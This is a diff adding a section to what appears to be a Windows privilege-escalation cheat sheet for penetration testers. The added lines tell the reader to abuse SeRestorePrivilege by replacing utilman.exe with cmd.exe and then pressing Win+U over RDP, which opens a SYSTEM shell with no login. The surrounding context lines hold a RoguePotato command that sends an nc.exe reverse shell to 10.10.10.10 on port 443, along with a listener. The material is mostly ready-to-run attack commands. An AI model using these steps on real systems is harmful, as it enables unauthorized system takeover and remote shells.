@@ -277,6 +277,17 @@ RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 99
 
 nc.exe -nlvp 3001
 ```
+##### SeRestorePrivilege To System
+SeRestorePrivilege permission required
+
+GUI Version:
+```
+.\EnableSeRestorePrivilege.ps1 (Enable SeRestore)
+mv C:\Windows\System32\utilman.exe C:\Windows\System32\utilman.old
+mv C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
+Kali: rdesktop victom_ip
+Kali: win+U to skip credential input
+```
 ##### PowerUp.ps1
 ```
 Service Enumeration:
